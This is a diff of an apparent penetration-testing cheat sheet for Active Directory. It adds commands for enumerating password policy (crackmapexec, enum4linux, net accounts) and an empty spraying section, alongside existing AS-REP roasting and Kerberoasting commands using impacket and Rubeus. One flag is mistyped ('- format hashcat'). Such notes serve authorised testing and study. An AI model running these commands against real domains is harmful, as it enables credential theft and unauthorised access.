@@ -1,12 +1,16 @@
 #### Check Policy
+```
+crackmapexec <ip> -u <user> -p <password> --pass-pol
+enum4linux -u <user> -p <pass> -P <ip>
+net accounts
+```
 
 #### Spray
+```
 
-##### Windows
-##### Linux
+```
 
 #### AS-REP Roasting
-
 ```
 #Gets all users.
 impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>
@@ -16,7 +20,6 @@ impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>
 impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile <hashes.txt>
 ```
 #### Kerberoasting
-
 ```
 #Roasting
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
